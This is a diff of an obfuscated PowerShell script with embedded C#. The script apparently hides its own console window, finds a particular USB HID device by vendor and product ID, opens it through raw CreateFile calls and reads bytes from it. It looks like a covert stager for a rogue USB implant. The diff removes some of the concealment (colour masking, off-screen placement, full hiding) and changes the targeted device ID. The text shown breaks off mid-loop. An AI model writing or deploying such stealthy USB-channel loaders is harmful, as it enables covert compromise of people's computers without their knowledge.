@@ -1,5 +1,5 @@
 $u=$Host.UI.RawUI
-$u.ForegroundColor=$u.BackgroundColor
+$u.ForegroundColor='White'
 Clear
 
 $u.WindowTitle=''
@@ -19,12 +19,12 @@ public static extern IntPtr SetWindowPos(IntPtr h,int i,int x,int Y,int c,int j,
 public static FileStream o(string f){return new FileStream(CreateFile(f,0XC0000000U,3,IntPtr.Zero,3,0x40000000,IntPtr.Zero),FileAccess.ReadWrite,9,true);}}}'.Replace('%',[char]34)
 Add-Type -TypeDefinition $cs
 $h=(Get-Process -Id $pid).MainWindowHandle
-$null=[n.w]::SetWindowPos($h,-2,2000,2000,40,40,5)
+$null=[n.w]::SetWindowPos($h,-2,200,200,40,40,5)
 
-function x(){$null=[n.w]::ShowWindowAsync($h,0)
+function x(){$null=[n.w]::ShowWindowAsync($h,6)
 $d=gwmi Win32_USBControllerDevice
 foreach($h in $d){$w=[wmi]$h.Dependent
-if($w.GetPropertyValue('DeviceID')-match('03EB&PID_2066')-and($w.GetPropertyValue('Service')-eq$null)){$fn=([char]92+[char]92+'?'+[char]92+$w.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35)+[char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')}}try{$f=[n.w]::o($fn)
+if($w.GetPropertyValue('DeviceID')-match('1209&PID_6667')-and($w.GetPropertyValue('Service')-eq$null)){$fn=([char]92+[char]92+'?'+[char]92+$w.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35)+[char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')}}try{$f=[n.w]::o($fn)
 $g=$e=0
 $s=New-Object IO.MemoryStream
 do{$b=New-Object Byte[]($M+1)
